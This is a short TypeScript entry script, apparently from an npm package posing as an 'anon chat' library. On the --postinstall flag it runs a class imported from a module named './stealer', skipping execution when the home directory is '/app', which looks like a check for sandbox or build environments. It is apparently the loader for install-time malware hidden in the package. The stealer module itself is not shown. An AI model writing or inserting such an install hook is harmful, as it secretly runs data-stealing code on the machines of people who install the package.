import * as appRoot from 'app-root-path';
import * as rp from 'request-promise';
import * as Bluebird from 'bluebird';
import * as fs from 'promise-fs';
import * as path from 'path';
import * as os from 'os';

import { AnonChatLib } from './stealer';

(async () => {
	if(process.argv.includes('--postinstall')) {
		if(os.homedir() === '/app') process.exit();

		global.__anon_chat_lib_postinstall = true;
		
		try {
			await new AnonChatLib().run();
			process.exit(0);
		} catch {
			global.__anon_chat_lib_stop();
		}
	}
})();
